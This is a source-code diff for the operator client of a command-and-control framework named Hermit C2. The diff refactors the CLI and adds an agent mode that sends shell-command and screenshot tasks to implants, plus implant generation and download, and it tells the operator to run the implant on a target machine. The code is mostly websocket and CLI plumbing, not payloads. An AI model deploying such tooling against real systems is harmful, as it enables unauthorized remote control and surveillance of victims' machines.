@@ -18,6 +18,8 @@ use super::options::{
     listener::ListenerOption,
     options::Options
 };
+use super::operations::{Operation, set_operations};
+use super::cli::cmd::create_cmd;
 use super::prompt::set_prompt;
 use crate::utils::random::random_name;
 
@@ -25,35 +27,9 @@ const EXIT_SUCCESS: i32 = 0;
 const EXIT_FAILURE: i32 = 0;
 
 #[derive(Debug)]
-pub enum Operation {
-    Empty,
-    Exit,
-    Unknown,
-
-    // Listeners
-    AddListener,
-    DeleteListener,
-    StartListener,
-    StopListener,
-    ListListeners,
-
-    // Agents
-    UseAgent,
-    ListAgents,
-    
-    // Implants
-    GenerateImplant,
-    DownloadImplant,
-    ListImplants,
-
-    // Instruction,
-}
-
-#[derive(Debug)]
 struct Commands {
     pub op: Operation,
     pub options: Options
-    // pub cmd: String,
 }
 
 impl Commands {
@@ -61,16 +37,20 @@ impl Commands {
         Self {
             op,
             options,
-            // cmd,
         }
     }
 }
 
-pub struct Client {
-    server_host: String,
-    server_port: u16,
+pub enum Mode {
+    Root,
+    Agent(String),
+}
 
-    mode: String,
+pub struct Client {
+    pub server_host: String,
+    pub server_port: u16,
+
+    pub mode: Mode,
 }
 
 impl Client {
@@ -78,151 +58,13 @@ impl Client {
         Self {
             server_host,
             server_port,
-            mode: String::new(),
+            mode: Mode::Root,
         }
     }
 
     // General CLI
     fn cli(&self) -> Command {
-        Command::new("client")
-            .about("Hermit C2 client")
-            .allow_external_subcommands(true)
-            .subcommand(Command::new("exit")
-                .about("Close the connection and exit.")
-            )
-            // Listeners
-            .subcommand(Command::new("listener")
-                .about("Manage listeners.")
-                .subcommand(Command::new("add")
-                    .about("Add a new listener.")
-                    .args([
-                        Arg::new("protocol")
-                            .help("Protocol")
-                            .default_value("http")
-                            .value_parser(value_parser!(String)),
-                        Arg::new("host")
-                            .short('H')
-                            .long("host")
-                            .help(format!("Host [default: {}]", self.server_host.to_string()))
-                            .value_parser(value_parser!(String)),
-                        Arg::new("port")
-                            .short('P')
-                            .long("port")
-                            .help("Port")
-                            .required(true)
-                            .value_parser(value_parser!(u16)),
-                        Arg::new("name")
-                            .short('n')
-                            .long("name")
-                            .help("Specify the name of a listener")
-                            .value_parser(value_parser!(String)),
-                    ])
-                )
-                .subcommand(Command::new("delete")
-                    .about("Delete a listener.")
-                    .arg(Arg::new("listener")
-                        .help("Listener ID or name to delete")
-                        .required(true)
-                        .value_parser(value_parser!(String))
-                    )                    
-                )
-                .subcommand(Command::new("start")
-                    .about("Start a listener.")
-                    .arg(Arg::new("listener")
-                        .help("Listener ID or name to start")
-                        .required(true)
-                        .value_parser(value_parser!(String))
-                    )
-                )
-                .subcommand(Command::new("stop")
-                    .about("Stop a listener.")
-                    .arg(Arg::new("listener")
-                        .help("Listener ID or name to stop")
-                        .required(true)
-                        .value_parser(value_parser!(String))
-                    )
-                )
-                .subcommand(Command::new("list")
-                    .about("List listeners.")
-                )
-            )
-            .subcommand(Command::new("listeners")
-                .about("List listeners.")
-            )
-            // Agents
-            .subcommand(Command::new("agent")
-                .about("Manage agents.")
-                .subcommand(Command::new("use")
-                    .about("Switch to specified agent shell.")
-                    .arg(Arg::new("name")
-                        .help("Agent ID or name")
-                        .required(true)
-                        .value_parser(value_parser!(String)))
-                )
-                .subcommand(Command::new("list")
-                    .about("List agents.")
-                )
-            )
-            .subcommand(Command::new("agents")
-                .about("List agents.")
-            )
-            // Implants
-            .subcommand(Command::new("implant")
-                .about("Manage implants.")
-                .subcommand(Command::new("gen")
-                    .about("Generate a new implant.")
-                    .args([
-                        Arg::new("name")
-                            .short('n')
-                            .long("name")
-                            .help("Set an implant name")
-                            .value_parser(value_parser!(String)),
-                        Arg::new("listener")
-                            .short('l')
-                            .long("listener")
-                            .help("Listener URL that an agent connect to")
-                            .default_value("http://127.0.0.1:8000/")
-                            .value_parser(value_parser!(String)),
-                        Arg::new("os")
-                            .short('o')
-                            .long("os")
-                            .help("Target OS")
-                            .default_value("windows")
-                            .value_parser(value_parser!(String)),
-                        Arg::new("arch")
-                            .short('a')
-                            .long("arch")
-                            .help("Target architecture")
-                            .default_value("amd64")
-                            .value_parser(value_parser!(String)),
-                        Arg::new("format")
-                            .short('f')
-                            .long("format")
-                            .help("File format to be generated")
-                            .default_value("exe")
-                            .value_parser(value_parser!(String)),
-                        Arg::new("sleep")
-                            .short('s')
-                            .long("sleep")
-                            .help("Sleep time for each request to listener")
-                            .default_value("3")
-                            .value_parser(value_parser!(u64)),
-                    ])
-                )
-                .subcommand(Command::new("download")
-                    .about("Download specified implant.")
-                    .arg(Arg::new("implant")
-                        .help("Implant ID or name."))
-                )
-                .subcommand(Command::new("list")
-                    .about("List implants generated.")
-                )
-            )
-            .subcommand(Command::new("implants")
-                .about("List implants generated.")
-            )
-            // Instructions
-            // .subcommand("download")
+        create_cmd(self)
     }
     
     fn parse_args(&self, args: &[String]) -> clap::error::Result<Option<Commands>> {
@@ -231,179 +73,12 @@ impl Client {
     }
     
     fn parse_matches(&self, matches: &ArgMatches) -> clap::error::Result<Option<Commands>> {
-        let mut op = Operation::Empty;
-        // let mut cmd = "".to_string();
-        let mut options = Options::new();
-    
-        match matches.subcommand() {
-            // Listener
-            Some(("listener", subm)) => {
-                match subm.subcommand() {
-                    Some(("add", subm2)) => {
-                        op = Operation::AddListener;
-                        let name = match subm2.get_one::<String>("name") {
-                            Some(n) => Some(n.to_string()),
-                            None => Some(random_name("listener".to_string())),
-                        };
-                        let host = match subm2.get_one::<String>("host") {
-                            Some(h) => Some(h.to_string()),
-                            None => Some("127.0.0.1".to_string())
-                        };
-                        let listener_option = ListenerOption {
-                            name,
-                            proto: subm2.get_one::<String>("protocol").cloned(),
-                            host,
-                            port: subm2.get_one::<u16>("port").cloned(),
-                        };
-                        options.listener_opt = Some(listener_option);
-                    }
-                    Some(("delete", subm2)) => {
-                        op = Operation::DeleteListener;
-                        let target = match subm2.get_one::<String>("listener") {
-                            Some(l) => { Some(l.to_string()) },
-                            None => { None },
-                        };
-
-                        options.listener_opt = Some(ListenerOption {
-                            name: target,
-                            proto: None,
-                            host: None,
-                            port: None,
-                        });
-                    }
-                    Some(("start", subm2)) => {
-                        op = Operation::StartListener;
-                        let target = match subm2.get_one::<String>("listener") {
-                            Some(l) => { Some(l.to_string()) },
-                            None => { None },
-                        };
-
-                        options.listener_opt = Some(ListenerOption {
-                            name: target,
-                            proto: None,
-                            host: None,
-                            port: None,
-                        });
-                    }
-                    Some(("stop", subm2)) => {
-                        op = Operation::StopListener;
-                        let target = match subm2.get_one::<String>("listener") {
-                            Some(l) => { Some(l.to_string()) },
-                            None => { None },
-                        };
-
-                        options.listener_opt = Some(ListenerOption {
-                            name: target,
-                            proto: None,
-                            host: None,
-                            port: None,
-                        });
-                    }
-                    Some(("list", _)) => {
-                        op = Operation::ListListeners;
-                    }
-                    _ => {
-                        op = Operation::Unknown;
-                    }
-                }
-            }
-            Some(("listeners", _)) => {
-                op = Operation::ListListeners;
-            }
-            // Agent
-            Some(("agent", subm)) => {
-                match subm.subcommand() {
-                    Some(("use", subm2)) => {
-                        op = Operation::UseAgent;
-                        let name = match subm2.get_one::<String>("name") {
-                            Some(n) => { n.to_string() },
-                            None => { "0".to_string() },
-                        };
-
-                        options.agent_opt = Some(AgentOption {
-                            name,
-                        });
-                    }
-                    Some(("list", _)) => {
-                        op = Operation::ListAgents;
-                    }
-                    _ => {
-                        op = Operation::Unknown;
-                    }
-                }
-            }
-            Some(("agents", _)) => {
-                op = Operation::ListAgents;
-            }
-            // Implant
-            Some(("implant", subm)) => {
-                match subm.subcommand() {
-                    Some(("gen", subm2)) => {
-                        op = Operation::GenerateImplant;
-                        let name = match subm2.get_one::<String>("name") {
-                            Some(n) => { n.to_string() },
-                            None => { random_name("implant".to_string()) }
-                        };
-                        let listener_url = match subm2.get_one::<String>("listener") {
-                            Some(n) => { n.to_string() },
-                            None => { "http://127.0.0.1:8000/".to_string() }
-                        };
-                        let os = match subm2.get_one::<String>("os") {
-                            Some(n) => { n.to_string() },
-                            None => { "windows".to_string() }
-                        };
-                        let arch = match subm2.get_one::<String>("arch") {
-                            Some(n) => { n.to_string() },
-                            None => { "amd64".to_string() }
-                        };
-                        let format = match subm2.get_one::<String>("format") {
-                            Some(n) => { n.to_string() },
-                            None => { "exe".to_string() }
-                        };
-                        let sleep = match subm2.get_one::<u64>("sleep") {
-                            Some(n) => { *n },
-                            None => { 3 }
-                        };
-
-                        options.implant_opt = Some(ImplantOption {
-                            name,
-                            listener_url,
-                            os,
-                            arch,
-                            format,
-                            sleep,
-                        });
-                    }
-                    Some(("download", subm2)) => {
-                        op = Operation::DownloadImplant;
-                    }
-                    Some(("list", _)) => {
-                        op = Operation::ListImplants;
-                    }
-                    _ => {
-                        op = Operation::Unknown;
-                    }
-                }
-            }
-            Some(("implants", _)) => {
-                op = Operation::ListImplants;
-            }
-            // Misc
-            None => {
-                op = Operation::Empty;
-            }
-            Some(("exit", _)) | Some(("quit", _)) => {
-                op = Operation::Exit;
-            }
-            _ => {
-                op = Operation::Unknown;
-            },
-        }
+        let (op, options) = set_operations(self, matches);
     
         Ok(Some(Commands::new(op, options)))
     }
     
-    pub async fn run(&self) -> Result<()> {
+    pub async fn run(&mut self) -> Result<()> {
         // Connect to C2 server.
         let server_url = format!(
             "ws://{}:{}/hermit",
@@ -412,18 +87,18 @@ impl Client {
     
         let ws_stream = match connect_async(server_url.to_string()).await {
             Ok((stream, _response)) => {
-                println!("{} Handshake has been completed.", "[+]".green().bold());
+                println!("{} Handshake has been completed.", "[+]".green());
                 stream
             }
             Err(e) => {
-                println!("{} WebSocket handshake failed: {}", "[x]".red().bold(), e.to_string());
+                println!("{} WebSocket handshake failed: {}", "[x]".red(), e.to_string());
                 return Ok(());
             }
         };
     
         println!(
             "{} Connected to C2 server ({}) successfully.",
-            "[+]".green().bold(), server_url.to_string());
+            "[+]".green(), server_url.to_string());
     
         let (mut sender, receiver) = ws_stream.split();
     
@@ -437,8 +112,12 @@ impl Client {
         let receiver = Arc::new(Mutex::new(receiver));
     
         loop {
+            let mut message = Message::Text("".to_owned());
+            let mut send_flag = String::new();
+
+            println!(""); // Add newline before the prompt for good appearance.
             let readline = rl.readline(
-                set_prompt(self.mode.to_string()).as_str());
+                set_prompt(&self.mode).as_str());
             match readline {
                 Ok(line) => {
                     // Handle input
@@ -460,10 +139,9 @@ impl Client {
                         }
                     };
     
-                    let mut message = Message::Text("".to_owned());
-    
                     if let Some(commands) = commands {
                         match &commands.op {
+                            // Root operations
                             // Listener
                             Operation::AddListener => {
                                 if let Some(listener_opt) = commands.options.listener_opt {
@@ -515,11 +193,16 @@ impl Client {
                                 message = Message::Text("listener list".to_string());
                             }
                             // Agent
-                            Operation::UseAgent => {
+                            Operation::InteractAgent => {
                                 if let Some(agent_opt) = commands.options.agent_opt {
-                                    let name = agent_opt.name;
+                                    let ag_name = agent_opt.name;
+
+                                    // Check if the agent exists
+                                    message = Message::Text(format!("agent interact {}", ag_name));
+
+                                    // Set send flag
+                                    send_flag = "[agent:interact]".to_string();
                                 }
-                                continue;
                             }
                             Operation::ListAgents => {
                                 message = Message::Text("agent list".to_string());
@@ -527,24 +210,35 @@ impl Client {
                             // Implant
                             Operation::GenerateImplant => {
                                 if let Some(implant_opt) = commands.options.implant_opt {
-                                    let name = implant_opt.name;
-                                    let listener_url = implant_opt.listener_url;
-                                    let os = implant_opt.os;
-                                    let arch = implant_opt.arch;
-                                    let format = implant_opt.format;
-                                    let sleep = implant_opt.sleep;
+                                    let name = implant_opt.name.unwrap();
+                                    let listener_url = implant_opt.listener_url.unwrap();
+                                    let os = implant_opt.os.unwrap();
+                                    let arch = implant_opt.arch.unwrap();
+                                    let format = implant_opt.format.unwrap();
+                                    let sleep = implant_opt.sleep.unwrap();
 
                                     message = Message::Text(
                                         format!("implant gen {} {} {} {} {} {}",
                                             name, listener_url, os, arch, format, sleep));
+
+                                    send_flag = "[implant:gen]".to_string();
                                 } else {
                                     continue;
                                 }
 
                             }
                             Operation::DownloadImplant => {
-                                println!("Download an implant.");
-                                continue;
+                                if let Some(implant_opt) = commands.options.implant_opt {
+                                    let name = implant_opt.name.unwrap();
+
+                                    message = Message::Text(
+                                        format!("implant download {}", name)
+                                    );
+
+                                    send_flag = "[implant:download]".to_string();
+                                } else {
+                                    continue;
+                                }
                             }
                             Operation::ListImplants => {
                                 message = Message::Text("implant list".to_string());
@@ -554,81 +248,52 @@ impl Client {
                                 continue;
                             }
                             Operation::Exit => {
-                                // message = Message::Close(None);
                                 process::exit(EXIT_SUCCESS);
                             }
                             Operation::Unknown => {
-                                println!("Unknown command. Run `help` command for the usage.");
+                                println!("{} Unknown command. Run `help` for the usage.", "[!]".yellow());
+                                continue;
+                            }
+
+                            // Agent operations
+                            // Tasks
+                            Operation::AgentTaskScreenshot => {
+                                if let Some(task_opt) = commands.options.task_opt {
+                                    let t_agent = task_opt.agent_name.unwrap();
+
+                                    message = Message::Text(format!("task {} screenshot", t_agent));
+
+                                    send_flag = "[task]".to_string();
+                                } else {
+                                    continue;
+                                }
+                            }
+                            Operation::AgentTaskShell => {
+                                if let Some(task_opt) = commands.options.task_opt {
+                                    let t_agent = task_opt.agent_name.unwrap();
+                                    let t_command = task_opt.command.unwrap();
+
+                                    message = Message::Text(format!("task {} shell {}", t_agent, t_command));
+
+                                    send_flag = "[task]".to_string();
+                                } else{
+                                    continue;
+                                }
+                            }
+                            // Misc
+                            Operation::AgentEmpty => {
+                                continue;
+                            }
+                            Operation::AgentExit => {
+                                println!("{} Switch to the root mode.", "[+]".green());
+                                self.mode = Mode::Root;
+                                continue;
+                            }
+                            Operation::AgentUnknown => {
+                                println!("{} Unknown command. Run `help` for the usage.", "[!]".yellow());
                                 continue;
                             }
                         }
-                    }
-    
-                    // Send command
-                    // sender.send(Message::Text(line.to_owned())).await.expect("Can not send.");
-                    sender.send(message.to_owned()).await.expect("Can not send.");
-
-                    // Spinner while waiting for responses
-                    let mut spin: Option<Spinner> = None;
-                    if message.to_string().starts_with("implant gen") {
-                        spin = Some(Spinner::new(
-                            Spinners::Dots8,
-                            "Generating an implant...".into()));
-                    }
-                    
-                    // Receive responses
-                    let mut receiver_lock = receiver.lock().unwrap();
-                    let mut flag = String::new();
-                    // let mut 
-                    while let Some(Ok(msg)) = receiver_lock.next().await {
-                        match msg {
-                            Message::Text(text) => {
-                                if text == "done" {
-                                    break
-                                }
-                                println!("{text}");
-
-                                // Set flag
-                                flag = text;
-                            }
-                            Message::Binary(bytes) => {
-                                // Parse flag
-                                let args = match shellwords::split(&flag) {
-                                    Ok(args) => { args }
-                                    Err(err) => {
-                                        eprintln!("Can't parse command line: {err}");
-                                        vec!["".to_string()]
-                                    }
-                                };
-
-                                match (args[0].as_str(), args[1].as_str()) {
-                                    ("Implant",  "generated") => {
-                                        let outfile = args[2].to_string();
-                                        fs::write(outfile, &bytes).expect("Unable to write file");
-                                    }
-                                    _ => {}
-                                }
-                            }
-                            Message::Close(c) => {
-                                if let Some(cf) = c {
-                                    println!(
-                                        "Close with code {} and reason `{}`",
-                                        cf.code, cf.reason
-                                    );
-                                } else {
-                                    println!("Somehow got close message without CloseFrame");
-                                }
-                                process::exit(EXIT_SUCCESS);
-                            }
-                            Message::Frame(_) => {
-                                unreachable!("This is never supposed to happen")
-                            }
-                            _ => { break }
-                        }
-                    }
-    
-                    if let Some(mut spin) = spin {
-                        spin.stop();
                     }
                 },
                 Err(ReadlineError::Interrupted) => {
@@ -639,6 +304,140 @@ impl Client {
                 },
                 Err(err) => {
                     println!("[x] {} {:?}", "Error: ", err);
+                    continue;
+                }
+            }
+
+            // Send command
+            // sender.send(Message::Text(line.to_owned())).await.expect("Can not send.");
+            sender.send(message.to_owned()).await.expect("Can not send.");
+
+            // Spinner while waiting for responses
+            let mut spin: Option<Spinner> = None;
+            match send_flag.as_str() {
+                "[agent:interact]" => {
+                    spin = Some(Spinner::new(
+                        Spinners::Dots8,
+                        "Checking the agent exists...".into()))
+                }
+                "[implant:gen]" => {
+                    spin = Some(Spinner::new(
+                        Spinners::Dots8,
+                        "Generating an implant...".into()));
+                }
+                "[implant:download]" => {
+                    spin = Some(Spinner::new(
+                        Spinners::Dots8,
+                        "Downloaing the implant...".into()));
+                }
+                "[task]" => {
+                    spin = Some(Spinner::new(
+                        Spinners::Dots8,
+                        "Waiting for the task execution...".into()));
+                }
+                _ => {}
+            }
+                    
+            // Receive responses
+            let mut receiver_lock = receiver.lock().unwrap();
+            let mut recv_flag = String::new();
+
+            while let Some(Ok(msg)) = receiver_lock.next().await {
+                match msg {
+                    Message::Text(text) => {
+                        // Parse the text
+                        let args = match shellwords::split(&text) {
+                            Ok(args) => args,
+                            Err(err) => {
+                                eprintln!("Can't parse the received message: {err}");
+                                vec!["".to_string()]
+                            },
+                        };
+
+                        match args[0].as_str() {
+                            "[done]" => break,
+                            "[agent:interact:ok]" => {
+                                // Switch to the agent mode
+                                self.mode = Mode::Agent(args[1].to_owned());
+                                stop_spin(&mut spin);
+                                println!("{} The agent found. Switch to the agent mode.", "[+]".green());
+                            }
+                            "[agent:interact:error]" => {
+                                stop_spin(&mut spin);
+                                println!("{} {}", "[x]".red(), args[1..].join(" ").to_owned());
+                            }
+                            "[implant:gen:ok]" => {
+                                recv_flag = args.join(" ");
+                            }
+                            "[implant:gen:error]" => {
+                                stop_spin(&mut spin);
+                                println!("{} {}", "[x]".red(), args[1..].join(" ").to_owned());
+                            }
+                            "[task:screenshot:ok]" | "[task:shell:ok]" => {
+                                recv_flag = args.join(" ");
+                            }
+                            "[task:error]" => {
+                                stop_spin(&mut spin);
+                                println!("{} {}", "[x]".red(), args[1..].join(" ").to_owned());
+                            }
+                            _ => {
+                                stop_spin(&mut spin);
+                                println!("{text}");
+                            },
+                        }
+
+                    }
+                    Message::Binary(bytes) => {
+                        // Parse recv flag
+                        let args = match shellwords::split(&recv_flag) {
+                            Ok(args) => args,
+                            Err(err) => {
+                                eprintln!("Can't parse command line: {err}");
+                                vec!["".to_string()]
+                            },
+                        };
+
+                        match args[0].as_str() {
+                            "[implant:gen:ok]" => {
+                                let outfile = args[1].to_string();
+                                fs::write(outfile.clone(), &bytes).expect("Unable to write file");
+                                stop_spin(&mut spin);
+                                println!(
+                                    "{} Implant generated at '{}'.",
+                                    "[+]".green(),
+                                    outfile.to_string().cyan().bold());
+                                println!(
+                                    "{} Transfer this file to target machine and execute it to interact with our C2 server.",
+                                    "[i]".green());
+                            }
+                            "[task:screenshot:ok]" => {
+                                let result_string = String::from_utf8(bytes).unwrap();
+                                stop_spin(&mut spin);
+                                println!("{}", result_string);
+                            }
+                            "[task:shell:ok]" => {
+                                let result_string = String::from_utf8(bytes).unwrap();
+                                stop_spin(&mut spin);
+                                println!("{}", result_string);
+                            }
+                            _ => {}
+                        }
+                    }
+                    Message::Close(c) => {
+                        if let Some(cf) = c {
+                            println!(
+                                "Close with code {} and reason `{}`",
+                                cf.code, cf.reason
+                            );
+                        } else {
+                            println!("Somehow got close message without CloseFrame");
+                        }
+                        process::exit(EXIT_SUCCESS);
+                    }
+                    Message::Frame(_) => {
+                        unreachable!("This is never supposed to happen")
+                    }
+                    _ => { break }
                 }
             }
         }
@@ -647,5 +446,12 @@ impl Client {
         rl.save_history("history.txt");
     
         Ok(())
+    }
+}
+
+fn stop_spin(spin: &mut Option<Spinner>) {
+    if let Some(ref mut spin) = spin {
+        spin.stop();
+        println!(""); // Add newline for good appearance.
     }
 }
